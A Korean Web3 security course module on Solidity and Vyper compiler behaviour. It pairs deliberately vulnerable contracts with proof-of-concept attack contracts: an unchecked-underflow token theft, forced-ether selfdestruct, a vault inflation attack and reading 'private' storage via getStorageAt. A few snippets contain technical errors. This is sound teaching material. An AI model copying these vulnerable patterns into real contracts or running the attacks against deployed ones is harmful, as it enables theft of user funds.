# Phase 2: Solidity/Vyper 언어 행동 분석

> Web3 보안 트레이닝 코스 - 3개월 과정 Phase 2
> 목표: 컴파일러 수준의 언어 행동 이해를 통한 취약점 식별 능력 배양

---

## 목차

1. [Solidity 컴파일러 행동 분석](#1-solidity-컴파일러-행동-분석)
   - 1.1 Panic 코드 분류
   - 1.2 에러 계층 구조
   - 1.3 ABI 인코딩/디코딩
   - 1.4 unchecked 블록
   - 1.5 private 가시성의 한계
   - 1.6 selfdestruct 폐기
   - 1.7 0.8.0 오버플로우 보호
   - 1.8 정수 나눗셈 절삭
   - 1.9 send/transfer 폐기
2. [Vyper 특유 취약점](#2-vyper-특유-취약점)
   - 2.1 Reentrancy Lock 버그
   - 2.2 이중 평가 버그
   - 2.3 평가 순서 문제
   - 2.4 Vyper가 제거한 취약점 클래스
   - 2.5 기타 Vyper 취약점
3. [실습: Solidity vs Vyper 비교](#3-실습-solidity-vs-vyper-비교)
4. [CTF 연습 문제](#4-ctf-연습-문제)
5. [참고 자료](#5-참고-자료)

---

## 1. Solidity 컴파일러 행동 분석

### 1.1 Panic 코드 분류

Solidity 0.8.0부터 런타임 오류는 `Panic(uint256)` 에러로 표현된다. 각 코드는 특정 오류 조건을 나타내며, 감사 시 revert 데이터의 첫 4바이트가 `0x4e487b71`이면 Panic임을 알 수 있다.

#### Panic 에러 시그니처
```
keccak256("Panic(uint256)") = 0x4e487b71...
```

#### 코드 표

| 코드 | 16진수 | 트리거 조건 |
|------|--------|------------|
| 0 | `0x00` | 컴파일러 내부 오류 (사용자 코드에서 발생 불가) |
| 1 | `0x01` | `assert()` 실패 |
| 17 | `0x11` | 산술 오버플로우/언더플로우 (checked 산술) |
| 18 | `0x12` | 0으로 나누기 또는 0으로 모듈로 |
| 33 | `0x21` | 범위를 벗어난 enum 변환 |
| 34 | `0x22` | 잘못 인코딩된 storage byte array 접근 |
| 49 | `0x31` | 빈 배열에서 `.pop()` 호출 |
| 50 | `0x32` | 배열/슬라이스 인덱스 범위 초과 |
| 65 | `0x41` | 과도한 메모리 할당 또는 너무 큰 배열 생성 |
| 81 | `0x51` | 초기화되지 않은 내부 함수 포인터 호출 |

#### 각 코드별 트리거 코드 예제

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PanicExamples {

    // Panic 0x01: assert 실패
    // require()와 달리 assert()는 프로그래머 실수를 나타냄
    // 남은 가스를 모두 소모 (0.8.0 이전), 0.8.0 이후에는 환불됨
    function triggerAssert(uint x) external pure {
        assert(x != 0); // x == 0이면 Panic(0x01)
    }

    // Panic 0x11: 산술 오버플로우
    // 0.8.0부터 기본 산술은 checked
    function triggerOverflow(uint8 x) external pure returns (uint8) {
        return x + 255; // x > 0이면 오버플로우 → Panic(0x11)
    }

    // Panic 0x11: 산술 언더플로우
    function triggerUnderflow(uint x) external pure returns (uint) {
        return x - 1; // x == 0이면 언더플로우 → Panic(0x11)
    }

    // Panic 0x12: 0으로 나누기
    function triggerDivByZero(uint a, uint b) external pure returns (uint) {
        return a / b; // b == 0이면 Panic(0x12)
    }

    // Panic 0x12: 0으로 모듈로
    function triggerModByZero(uint a, uint b) external pure returns (uint) {
        return a % b; // b == 0이면 Panic(0x12)
    }

    // Panic 0x21: 잘못된 enum 변환
    enum Status { Active, Inactive }
    function triggerBadEnum(uint x) external pure returns (Status) {
        return Status(x); // x >= 2이면 Panic(0x21)
    }

    // Panic 0x31: 빈 배열 pop
    uint[] public arr;
    function triggerEmptyPop() external {
        arr.pop(); // arr가 비어있으면 Panic(0x31)
    }

    // Panic 0x32: 배열 범위 초과
    uint[3] public fixedArr = [1, 2, 3];
    function triggerOutOfBounds(uint idx) external view returns (uint) {
        return fixedArr[idx]; // idx >= 3이면 Panic(0x32)
    }

    // Panic 0x41: 과도한 메모리 할당
    // 실제로는 가스 부족으로 먼저 revert될 가능성 높음
    function triggerMemoryAlloc(uint size) external pure returns (uint[] memory) {
        return new uint[](size); // size가 매우 크면 Panic(0x41)
    }

    // Panic 0x51: 초기화되지 않은 함수 포인터
    function(uint) internal pure returns (uint) uninitializedFn;
    function triggerUninitFn(uint x) external pure returns (uint) {
        function(uint) internal pure returns (uint) fn;
        return fn(x); // 초기화되지 않은 fn 호출 → Panic(0x51)
    }
}
```

#### Panic 코드 디코딩 (off-chain)

```javascript
// ethers.js로 Panic 코드 디코딩
const { ethers } = require("ethers");

async function decodePanic(revertData) {
    // revert 데이터 형식: 0x4e487b71 + uint256(panic code)
    const PANIC_SELECTOR = "0x4e487b71";

    if (revertData.startsWith(PANIC_SELECTOR)) {
        const panicCode = ethers.BigNumber.from(
            "0x" + revertData.slice(10) // selector(4bytes) 이후
        ).toNumber();

        const descriptions = {
            0x01: "assert() 실패",
            0x11: "산술 오버플로우/언더플로우",
            0x12: "0으로 나누기",
            0x21: "잘못된 enum 변환",
            0x31: "빈 배열 pop",
            0x32: "배열 범위 초과",
            0x41: "과도한 메모리 할당",
            0x51: "초기화되지 않은 함수 포인터",
        };

        return `Panic(${panicCode}): ${descriptions[panicCode] || "알 수 없음"}`;
    }
    return "Panic이 아님";
}
```

---

### 1.2 에러 계층 구조

Solidity에는 세 종류의 에러 메커니즘이 있다.

#### 에러 타입 비교

```
Error(string)   → require() / revert("메시지")
Panic(uint256)  → assert() / 런타임 오류
CustomError     → revert CustomError(params)
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// 커스텀 에러 정의 (0.8.4+)
error InsufficientBalance(uint256 available, uint256 required);
error Unauthorized(address caller);
error Expired(uint256 deadline, uint256 current);

contract ErrorHierarchy {
    mapping(address => uint256) public balances;
    address public owner;
    uint256 public deadline;

    constructor() {
        owner = msg.sender;
        deadline = block.timestamp + 30 days;
    }

    // Error(string): require 사용
    function withdrawWithRequire(uint256 amount) external {
        require(balances[msg.sender] >= amount, "잔액 부족");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    // CustomError: 더 가스 효율적, 더 많은 정보
    function withdrawWithCustomError(uint256 amount) external {
        if (balances[msg.sender] < amount) {
            revert InsufficientBalance(balances[msg.sender], amount);
        }
        if (block.timestamp > deadline) {
            revert Expired(deadline, block.timestamp);
        }
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    // Panic(0x01): assert 사용 - 불변 검증에만 사용
    function invariantCheck() external view {
        assert(address(this).balance >= getTotalBalance());
    }

    function getTotalBalance() internal view returns (uint256 total) {
        // ... 실제 구현
    }
}
```

#### try/catch에서의 에러 처리

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IExternalContract {
    function riskyOperation(uint256 x) external returns (uint256);
}

error CustomError(string reason);

contract TryCatchExample {
    IExternalContract public external;

    constructor(address _external) {
        external = IExternalContract(_external);
    }

    function safeCall(uint256 x) external returns (uint256 result, string memory errorMsg) {
        try external.riskyOperation(x) returns (uint256 _result) {
            // 성공 시
            return (_result, "");
        } catch Error(string memory reason) {
            // require/revert("메시지")로 발생한 Error(string)
            return (0, string(abi.encodePacked("Error: ", reason)));
        } catch Panic(uint256 code) {
            // assert/산술오류 등으로 발생한 Panic(uint256)
            // Solidity 0.8.1+에서 지원
            return (0, string(abi.encodePacked("Panic code: ", code)));
        } catch (bytes memory rawData) {
            // 커스텀 에러 또는 기타 revert 데이터
            // 수동으로 디코딩 필요
            if (rawData.length >= 4) {
                bytes4 selector;
                assembly {
                    selector := mload(add(rawData, 32))
                }
                // selector로 에러 타입 식별
            }
            return (0, "Unknown error");
        }
    }
}
```

#### revert 데이터 수동 디코딩

```python
# Python으로 revert 데이터 디코딩
from eth_abi import decode
from eth_hash.auto import keccak

def decode_revert(revert_data: bytes):
    if len(revert_data) < 4:
        return "데이터 없음"

    selector = revert_data[:4].hex()

    # Error(string) - 0x08c379a0
    if selector == "08c379a0":
        try:
            (msg,) = decode(["string"], revert_data[4:])
            return f"Error: {msg}"
        except:
            return "Error 디코딩 실패"

    # Panic(uint256) - 0x4e487b71
    elif selector == "4e487b71":
        try:
            (code,) = decode(["uint256"], revert_data[4:])
            return f"Panic(0x{code:02x})"
        except:
            return "Panic 디코딩 실패"

    # 커스텀 에러
    else:
        return f"커스텀 에러 selector: 0x{selector}"
```

---

### 1.3 ABI 인코딩/디코딩

ABI(Application Binary Interface) 인코딩은 EVM에서 데이터를 직렬화하는 표준 방식이다. 잘못된 디코딩은 타입 혼동 공격으로 이어진다.

#### 정적 타입 인코딩 규칙

정적 타입(uint, int, bool, bytes1-32, address)은 32바이트로 패딩된다.

```
함수 호출: transfer(address to, uint256 amount)
입력: to = 0xABCD...1234, amount = 1000

인코딩 결과 (hex):
- 함수 셀렉터: keccak256("transfer(address,uint256)")[0:4]
  = 0xa9059cbb
- to (address, 20바이트 → 32바이트 좌측 제로패딩):
  0x000000000000000000000000ABCD...1234
- amount (uint256, 32바이트):
  0x00000000000000000000000000000000000000000000000000000000000003E8
```

```python
# Python으로 ABI 인코딩 직접 구현 (이해용)
def encode_address(addr: str) -> bytes:
    # 0x 제거 후 20바이트, 좌측 12바이트 제로패딩
    addr_bytes = bytes.fromhex(addr.replace("0x", ""))
    return b'\x00' * 12 + addr_bytes  # 32바이트

def encode_uint256(value: int) -> bytes:
    return value.to_bytes(32, byteorder='big')

def encode_bool(value: bool) -> bytes:
    return (1 if value else 0).to_bytes(32, byteorder='big')

# 함수 셀렉터
from eth_hash.auto import keccak
def function_selector(sig: str) -> bytes:
    return keccak(sig.encode())[:4]

selector = function_selector("transfer(address,uint256)")
print(selector.hex())  # a9059cbb
```

#### 동적 타입 인코딩 규칙

`string`, `bytes`, `T[]` 같은 동적 타입은 오프셋-길이-데이터 구조를 사용한다.

```
함수 호출: foo(string message, uint256 value)
입력: message = "Hello", value = 42

인코딩 (32바이트 청크로 표시):
Slot 0: 0x0000...0040   ← string의 오프셋 (64 = 0x40, 슬롯 2부터)
Slot 1: 0x0000...002A   ← value = 42
Slot 2: 0x0000...0005   ← string 길이 = 5
Slot 3: 0x48656c6c6f00...00  ← "Hello" + 우측 제로패딩
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ABIDemo {
    // abi.encode: 표준 ABI 인코딩, 32바이트 정렬
    function encodeStandard(address addr, uint256 val) external pure returns (bytes memory) {
        return abi.encode(addr, val);
        // 64바이트 반환: 32(address) + 32(uint256)
    }

    // abi.encodePacked: 타이트 패킹, 패딩 없음
    function encodePacked(address addr, uint256 val) external pure returns (bytes memory) {
        return abi.encodePacked(addr, val);
        // 52바이트 반환: 20(address) + 32(uint256)
    }

    // abi.encodeWithSelector: 함수 셀렉터 포함
    function encodeWithSelector(address to, uint256 amount) external pure returns (bytes memory) {
        return abi.encodeWithSelector(
            bytes4(keccak256("transfer(address,uint256)")),
            to,
            amount
        );
    }

    // abi.encodeWithSignature: 문자열 시그니처 사용
    function encodeWithSig(address to, uint256 amount) external pure returns (bytes memory) {
        return abi.encodeWithSignature("transfer(address,uint256)", to, amount);
    }
}
```

#### 타입 혼동 공격 (Type Confusion)

`abi.encodePacked`에서 동적 타입 여러 개를 연결하면 해시 충돌이 발생할 수 있다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 취약한 코드: abi.encodePacked 해시 충돌
contract VulnerableSignature {
    mapping(bytes32 => bool) public usedSignatures;

    // 취약점: abi.encodePacked("AB", "C") == abi.encodePacked("A", "BC")
    function verifyAndExecute(
        string calldata param1,
        string calldata param2,
        bytes calldata signature
    ) external {
        bytes32 hash = keccak256(abi.encodePacked(param1, param2));

        require(!usedSignatures[hash], "이미 사용된 서명");
        require(_verify(hash, signature), "유효하지 않은 서명");

        usedSignatures[hash] = true;
        // ... 실행
    }

    // 공격 시나리오:
    // 정상: param1="transfer(", param2="victim,100)"
    // 공격: param1="transfer(victim,", param2="100)"
    // 두 경우 모두 동일한 해시 생성!

    function _verify(bytes32 hash, bytes calldata sig) internal pure returns (bool) {
        // ... 서명 검증 로직
        return true;
    }
}

// 안전한 코드: abi.encode 사용
contract SafeSignature {
    mapping(bytes32 => bool) public usedSignatures;

    function verifyAndExecute(
        string calldata param1,
        string calldata param2,
        bytes calldata signature
    ) external {
        // abi.encode는 각 파라미터의 길이를 포함하여 충돌 방지
        bytes32 hash = keccak256(abi.encode(param1, param2));

        require(!usedSignatures[hash], "이미 사용된 서명");
        require(_verify(hash, signature), "유효하지 않은 서명");

        usedSignatures[hash] = true;
    }

    function _verify(bytes32 hash, bytes calldata sig) internal pure returns (bool) {
        return true;
    }
}
```

#### 수동 ABI 디코딩 실습

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ManualABIDecode {
    // calldata에서 직접 파라미터 읽기 (어셈블리)
    function readCalldata() external pure returns (address to, uint256 amount) {
        assembly {
            // calldata 레이아웃:
            // [0:4]   = 함수 셀렉터
            // [4:36]  = 첫 번째 파라미터 (address)
            // [36:68] = 두 번째 파라미터 (uint256)
            to := calldataload(4)
            amount := calldataload(36)
        }
    }

    // bytes 데이터에서 수동 디코딩
    function decodeRaw(bytes calldata data) external pure
        returns (address addr, uint256 val, string memory str)
    {
        // abi.decode 사용 (안전한 방법)
        (addr, val, str) = abi.decode(data, (address, uint256, string));
    }

    // 동적 타입 오프셋 직접 파싱
    function parseOffset(bytes calldata data, uint256 slot)
        external pure returns (uint256 offset)
    {
        assembly {
            // data.offset + slot * 32 위치에서 오프셋 값 읽기
            offset := calldataload(add(data.offset, mul(slot, 32)))
        }
    }
}
```

---

### 1.4 unchecked 블록

Solidity 0.8.0부터 산술 연산은 기본적으로 오버플로우/언더플로우를 체크한다. `unchecked { }` 블록은 이 체크를 비활성화하여 가스를 절약하지만 새로운 공격 표면이 된다.

#### 0.8.0 이전 vs 이후 동작

```solidity
// 0.8.0 이전 (SafeMath 없이)
pragma solidity ^0.7.0;
contract OldArithmetic {
    function add(uint8 a, uint8 b) public pure returns (uint8) {
        return a + b; // 255 + 1 = 0 (조용히 오버플로우!)
    }
}

// 0.8.0 이후 (기본 checked)
pragma solidity ^0.8.0;
contract NewArithmetic {
    function add(uint8 a, uint8 b) public pure returns (uint8) {
        return a + b; // 255 + 1 → Panic(0x11) revert
    }

    // unchecked로 0.7 이전 동작 재현
    function addUnchecked(uint8 a, uint8 b) public pure returns (uint8) {
        unchecked {
            return a + b; // 255 + 1 = 0 (오버플로우 허용)
        }
    }
}
```

#### unchecked 가스 최적화 패턴

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GasOptimization {
    // 안전하게 unchecked 사용: 조건 검증 후 unchecked
    function safeAddUnchecked(uint256 a, uint256 b) external pure returns (uint256 c) {
        unchecked {
            c = a + b;
            require(c >= a, "오버플로우"); // 수동 체크
        }
    }

    // 반복문에서 unchecked - 가장 일반적인 패턴
    function sumArray(uint256[] calldata arr) external pure returns (uint256 sum) {
        uint256 len = arr.length;
        for (uint256 i = 0; i < len; ) {
            sum += arr[i];
            unchecked { ++i; } // i는 절대 오버플로우 안 함 (len < 2^256)
        }
    }

    // 잘못된 unchecked 사용
    function dangerousDecrement(uint256 balance, uint256 amount) external pure returns (uint256) {
        unchecked {
            return balance - amount; // balance < amount이면 엄청난 값 반환!
        }
    }
}
```

#### PoC: unchecked 블록 악용

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 취약한 토큰 컨트랙트
contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor() {
        totalSupply = 1000 ether;
        balances[msg.sender] = totalSupply;
    }

    // 취약점: unchecked 블록에서 잔액 검증 없이 빼기
    function transfer(address to, uint256 amount) external {
        // 외부에서 오는 amount에 대한 검증 없음
        unchecked {
            // 만약 balances[msg.sender] = 0 이고 amount = 1이면:
            // 0 - 1 = 2^256 - 1 (엄청난 양의 토큰!)
            balances[msg.sender] -= amount;
            balances[to] += amount;
        }
    }
}

// 공격 컨트랙트
contract Attacker {
    VulnerableToken public token;

    constructor(address _token) {
        token = VulnerableToken(_token);
    }

    function exploit() external {
        // 잔액 0에서 1 빼기 → 언더플로우로 2^256 - 1 획득
        token.transfer(address(this), 1);

        // 이제 2^256 - 1 토큰 보유
        uint256 stolen = token.balances(address(this));
        // stolen == 115792089237316195423570985008687907853269984665640564039457584007913129639935
    }
}

// 수정된 안전한 버전
contract SafeToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor() {
        totalSupply = 1000 ether;
        balances[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 amount) external {
        // 체크를 unchecked 밖에서 수행
        require(balances[msg.sender] >= amount, "잔액 부족");
        unchecked {
            balances[msg.sender] -= amount; // 이제 언더플로우 불가
            balances[to] += amount;         // to 주소는 totalSupply 이내
        }
    }
}
```

---

### 1.5 private 가시성의 한계

`private` 키워드는 다른 컨트랙트에서의 **함수 호출**을 막을 뿐, 블록체인 데이터 자체를 숨기지 않는다. EVM의 모든 스토리지는 공개적으로 읽을 수 있다.

#### 스토리지 레이아웃 이해

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StorageLayout {
    // 슬롯 0
    uint256 public publicValue = 42;

    // 슬롯 1 - private이지만 읽을 수 있음!
    uint256 private secretValue = 12345;

    // 슬롯 2
    address private owner;

    // 슬롯 3 - password는 절대 private이 아님!
    bytes32 private password = keccak256("supersecret");

    // 슬롯 4~ : 매핑 (슬롯 자체는 비어있고, keccak256(key, slot)에 값 저장)
    mapping(address => uint256) private balances;

    // 슬롯 5~ : 동적 배열 (슬롯에 길이, keccak256(slot) + index에 값)
    uint256[] private secretArray;
}
```

#### PoC: web3.eth.getStorageAt()로 private 변수 읽기

```javascript
// Node.js + ethers.js
const { ethers } = require("ethers");

async function readPrivateStorage() {
    const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");
    const contractAddress = "0x..."; // 배포된 컨트랙트 주소

    // 슬롯 1의 secretValue 읽기
    const slot1 = await provider.getStorageAt(contractAddress, 1);
    console.log("secretValue:", ethers.BigNumber.from(slot1).toString());
    // 출력: 12345

    // 슬롯 3의 password 읽기
    const slot3 = await provider.getStorageAt(contractAddress, 3);
    console.log("password hash:", slot3);
    // 출력: 0x... (keccak256("supersecret")의 해시값)

    // 매핑에서 특정 주소의 값 읽기
    const targetAddress = "0xUserAddress...";
    const mappingSlot = 4; // balances 매핑의 슬롯 번호

    // 매핑 키의 스토리지 위치 계산: keccak256(abi.encode(key, slot))
    const storageKey = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
            ["address", "uint256"],
            [targetAddress, mappingSlot]
        )
    );

    const balance = await provider.getStorageAt(contractAddress, storageKey);
    console.log("private balance:", ethers.BigNumber.from(balance).toString());
}
```

#### 취약한 패턴: 온체인 비밀번호

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 완전히 취약한 컨트랙트
contract PuzzleBox {
    bytes32 private password;
    bool public solved = false;

    constructor(bytes32 _password) {
        password = _password; // 트랜잭션 calldata에도 노출됨!
    }

    function solve(bytes32 _guess) external {
        require(_guess == password, "틀렸습니다");
        solved = true;
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

// 공격: 두 가지 방법으로 password 획득
// 1. eth_getStorageAt(contractAddress, 0) → password 직접 읽기
// 2. constructor 트랜잭션의 input data 디코딩
```

---

### 1.6 selfdestruct 폐기

`selfdestruct`는 컨트랙트를 파괴하고 이더를 수신자에게 강제 전송하는 opcode다. EIP-6049와 EIP-6780으로 인해 동작이 근본적으로 변경되었다.

#### EIP-6049: 폐기 예고 (Shanghai)

```
EIP-6049 (2022): selfdestruct를 deprecated로 표시
- selfdestruct 사용 시 컴파일러 경고
- 이더 전송 기능은 유지
- 코드/스토리지 삭제는 미래에 제거 예정
```

#### EIP-6780: selfdestruct 제한 (Dencun, 2024년 3월)

```solidity
// EIP-6780 이후 selfdestruct 동작:
// 1. 같은 트랜잭션에서 CREATE된 컨트랙트: 기존과 동일하게 동작 (코드/스토리지 삭제)
// 2. 이미 존재하는 컨트랙트: 이더만 전송, 코드/스토리지 유지

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestructExample {
    address payable public owner;

    constructor() payable {
        owner = payable(msg.sender);
    }

    // EIP-6780 이후:
    // - 배포 트랜잭션 내에서 호출하면: 컨트랙트 삭제 + 이더 전송
    // - 이후 트랜잭션에서 호출하면: 이더만 전송, 컨트랙트 유지
    function destroy() external {
        require(msg.sender == owner, "Not owner");
        selfdestruct(owner);
    }
}

// EIP-6780 영향: 메타모픽 공격 불가
// 이전: deploy → selfdestruct → 같은 주소에 다른 코드 deploy
// 이후: 이미 존재하는 컨트랙트는 selfdestruct해도 코드 삭제 안 됨
```

#### L2에서의 차이

```
중요 보안 고려사항:
- Ethereum mainnet: EIP-6780 적용 (Dencun, 2024-03-13)
- 일부 L2: EIP-6780 미적용 상태일 수 있음

감사 시 체크리스트:
□ 타겟 네트워크가 EIP-6780을 적용했는가?
□ selfdestruct를 사용하는 컨트랙트가 메타모픽 패턴인가?
□ 강제 이더 전송(forced ether)에 의존하는 로직이 있는가?
```

#### 강제 이더 전송 (Forced Ether)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 취약한 컨트랙트: address(this).balance에 의존하는 로직
contract VulnerableGame {
    uint256 public targetBalance = 10 ether;

    // 문제: selfdestruct로 강제 이더 전송 시 receive() 없이도 받음
    // 결과: balance != targetBalance가 영구적으로 깨질 수 있음
    function checkWin() external view returns (bool) {
        return address(this).balance == targetBalance;
    }

    receive() external payable {
        require(address(this).balance <= targetBalance, "초과");
    }
}

// 공격
contract ForceEtherAttacker {
    constructor(address payable target) payable {
        selfdestruct(target); // receive() 무시하고 강제 전송
    }
}
```

---

### 1.7 0.8.0 오버플로우 보호

#### 0.8.0 이전 vs 이후 비교

```solidity
// 0.7.x: 오버플로우가 조용히 발생
pragma solidity ^0.7.6;

contract OldToken {
    mapping(address => uint256) balances;

    // SafeMath 없이 사용하면 취약
    function transfer(address to, uint256 amount) external {
        balances[msg.sender] -= amount; // 잔액 0에서 언더플로우!
        balances[to] += amount;
    }
}

// OpenZeppelin SafeMath가 필요했던 이유:
// balances[msg.sender].sub(amount) → 내부적으로 require(b <= a, "SafeMath: subtraction overflow")
```

```solidity
// 0.8.x: 내장 checked 산술
pragma solidity ^0.8.0;

contract NewToken {
    mapping(address => uint256) balances;

    // 자동으로 오버플로우/언더플로우 체크
    function transfer(address to, uint256 amount) external {
        balances[msg.sender] -= amount; // 자동으로 require(balances[msg.sender] >= amount)
        balances[to] += amount;         // 자동으로 오버플로우 체크
    }
}
```

#### unchecked가 새로운 공격 표면인 이유

0.8.0 이후 코드를 감사할 때 `unchecked` 블록을 집중적으로 검토해야 한다:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 감사 포인트: unchecked 블록 내부의 모든 산술 연산
contract AuditTarget {
    mapping(address => uint256) public balances;

    // 취약: unchecked 내부에서 잔액 검증 없이 감소
    function withdrawFast(uint256 amount) external {
        unchecked {
            // "최적화"를 위해 unchecked 사용했지만 취약
            balances[msg.sender] -= amount;
        }
        payable(msg.sender).transfer(amount);
    }

    // 안전: unchecked 사용하면서도 사전 검증
    function withdrawSafe(uint256 amount) external {
        uint256 balance = balances[msg.sender];
        require(balance >= amount, "잔액 부족");
        unchecked {
            balances[msg.sender] = balance - amount; // 안전: 검증 완료
        }
        payable(msg.sender).transfer(amount);
    }
}
```

---

### 1.8 정수 나눗셈 절삭

EVM의 모든 나눗셈은 **0 방향으로 내림**한다 (truncation toward zero). 이는 정밀도 손실을 유발하고 금융 로직에서 자금 유출로 이어질 수 있다.

#### 기본 동작

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DivisionTruncation {
    // 모든 결과가 0 방향으로 절삭
    function examples() external pure returns (uint256 a, uint256 b, uint256 c) {
        a = 7 / 2;   // = 3 (3.5에서 절삭)
        b = 1 / 3;   // = 0 (0.33...에서 절삭)
        c = 100 / 3; // = 33 (33.33...에서 절삭)
    }

    // 정밀도 손실: 수수료 계산
    function calculateFee(uint256 amount, uint256 feePercent) external pure returns (uint256) {
        // 만약 amount = 10, feePercent = 1이면
        // 10 * 1 / 100 = 0.1 → 0 (수수료가 사라짐!)
        return amount * feePercent / 100;
    }
}
```

#### 정밀도 손실을 이용한 자금 추출 PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 취약한 Vault: 나눗셈 정밀도 문제
contract VulnerableVault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;

    function deposit(uint256 assets) external {
        uint256 newShares;
        if (totalShares == 0) {
            newShares = assets;
        } else {
            // 정밀도 손실 발생 가능
            newShares = assets * totalShares / totalAssets;
        }
        shares[msg.sender] += newShares;
        totalShares += newShares;
        totalAssets += assets;
    }

    function withdraw(uint256 shareAmount) external {
        // 역방향 정밀도 손실
        uint256 assets = shareAmount * totalAssets / totalShares;
        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;
        totalAssets -= assets;
        payable(msg.sender).transfer(assets);
    }
}

// 공격 시나리오: 인플레이션 공격 (ERC-4626)
contract InflationAttack {
    VulnerableVault public vault;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    // 1. 최초 1 wei 입금 (totalShares = 1)
    // 2. 직접 이더 전송으로 totalAssets 조작
    // 3. 피해자가 작은 금액 입금 시 shares = 0 획득
    // 4. 피해자의 자금이 공격자 지분으로 귀속
    function attack() external payable {
        // Step 1: 1 wei 입금으로 첫 번째 shares 획득
        vault.deposit(1);

        // Step 2: 직접 이더 전송 (receive() 없는 vault는 selfdestruct 필요)
        // vault에 10 ether를 강제 전송하면:
        // 피해자가 9 ether 입금 시: 9e18 * 1 / 10e18 = 0.9 → 0 shares!
    }
}
```

#### "곱셈 후 나눗셈" 규칙

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PrecisionBestPractice {
    uint256 constant PRECISION = 1e18;

    // 나쁜 방식: 나눗셈 먼저
    function badCalculation(uint256 amount, uint256 rate) external pure returns (uint256) {
        return (amount / 100) * rate; // amount가 100 미만이면 0 반환
    }

    // 좋은 방식: 곱셈 먼저
    function goodCalculation(uint256 amount, uint256 rate) external pure returns (uint256) {
        return (amount * rate) / 100; // 정밀도 유지
    }

    // 더 나은 방식: 스케일링 팩터 사용
    function scaledCalculation(uint256 amount, uint256 rateInBPS) external pure returns (uint256) {
        // rateInBPS: 기준점 (1 BPS = 0.01%, 10000 BPS = 100%)
        return amount * rateInBPS / 10000;
    }

    // 고정소수점 방식: 분자를 크게 만들기
    function fixedPointCalc(uint256 amount, uint256 feePercent) external pure returns (uint256) {
        return amount * feePercent * PRECISION / (100 * PRECISION);
        // PRECISION이 약분되어 사라지지만, 중간 계산에서 정밀도 유지
    }
}
```

---

### 1.9 send/transfer 폐기 (0.8.31)

#### 2300 gas stipend 문제

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SendTransferIssues {
    // transfer: 2300 gas 고정 할당, 실패 시 revert
    // 문제: 수신자 컨트랙트가 복잡한 receive() 보유 시 실패
    function badTransfer(address payable to, uint256 amount) external {
        to.transfer(amount); // 위험: 가스 비용 변경 시 실패 가능
    }

    // send: 2300 gas 고정 할당, 실패 시 false 반환
    // 문제: 반환값 무시 + 가스 문제
    function badSend(address payable to, uint256 amount) external {
        bool success = to.send(amount); // 위험: 실패해도 계속 진행
        // success 체크를 해도 가스 문제는 여전히 존재
    }

    // 권장 방식: call{value: amount}("")
    function goodCall(address payable to, uint256 amount) external {
        (bool success, ) = to.call{value: amount}("");
        require(success, "이더 전송 실패");
        // 모든 가스를 수신자에게 전달 (가스 제한 가능)
    }

    // 특정 가스량 지정
    function callWithGasLimit(address payable to, uint256 amount) external {
        (bool success, ) = to.call{value: amount, gas: 50000}("");
        require(success, "이더 전송 실패");
    }
}
```

#### 왜 2300 gas가 문제인가

```
2300 gas로 할 수 있는 것:
- SLOAD/SSTORE 한 번 불가 (SLOAD = 2100 gas cold, 100 gas warm)
- emit 간단한 이벤트
- 조건 체크 몇 가지

2300 gas로 할 수 없는 것 (EIP-2929 이후):
- storage 읽기/쓰기
- 다른 컨트랙트 호출
- 복잡한 로직

결론: 스마트 컨트랙트 지갑, 멀티시그, Gnosis Safe 등은
transfer/send로 이더를 받을 수 없는 경우 발생.
```

---

## 2. Vyper 특유 취약점

### 2.1 Vyper 컴파일러 Reentrancy Lock 버그

#### 버그 개요

Vyper 컴파일러 v0.2.15, v0.2.16, v0.3.0에서 `@nonreentrant` 데코레이터가 스토리지 슬롯을 잘못 할당하는 버그가 발견되었다. 동일한 키 이름을 가진 락이 다른 함수 간에 서로 다른 슬롯에 저장되어 교차 함수 재진입을 막지 못했다.

#### 버그 메커니즘

```python
# Vyper 컨트랙트 예시
# @version 0.3.0

# 취약한 버전: 두 함수의 @nonreentrant("lock")이
# 서로 다른 스토리지 슬롯을 사용할 수 있었음

interface ERC20:
    def transfer(_to: address, _value: uint256) -> bool: nonpayable
    def transferFrom(_from: address, _to: address, _value: uint256) -> bool: nonpayable

token: ERC20
balances: HashMap[address, uint256]

@external
@nonreentrant("lock")
def deposit(_amount: uint256):
    assert self.token.transferFrom(msg.sender, self, _amount)
    self.balances[msg.sender] += _amount

@external
@nonreentrant("lock")  # 같은 "lock" 키지만 버그로 인해 다른 슬롯 사용
def withdraw(_amount: uint256):
    assert self.balances[msg.sender] >= _amount
    self.balances[msg.sender] -= _amount
    assert self.token.transfer(msg.sender, _amount)
    # 취약: deposit의 lock과 withdraw의 lock이 독립적으로 작동
    # → withdraw 중에 deposit 호출 가능 (재진입)
```
